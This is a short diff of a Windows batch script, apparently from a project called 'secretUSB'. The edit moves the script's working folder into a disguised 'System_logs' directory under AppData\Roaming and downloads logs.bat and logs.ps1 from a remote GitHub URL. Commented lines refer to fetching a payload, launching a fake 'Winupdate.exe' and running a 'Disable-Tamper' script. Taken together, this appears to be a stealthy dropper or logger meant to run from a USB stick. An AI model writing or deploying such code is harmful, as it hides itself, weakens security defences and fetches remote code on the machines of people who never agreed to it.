@@ -84,9 +84,8 @@ REM powershell -command "start-bitstransfer https://direct-url-for-payload/xxx.e
 REM start  Winupdate.exe & cd %temp% & Disable-Tamper.cmd
 
 
-REM mkdir %USERPROFILE%\AppData\Roaming\System_logs
-REM cd %USERPROFILE%\AppData\Roaming\System_logs
-cd C:\Users\SYSWIN\Desktop
+mkdir %USERPROFILE%\AppData\Roaming\System_logs
+cd %USERPROFILE%\AppData\Roaming\System_logs
 
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.bat
 curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/logs.ps1
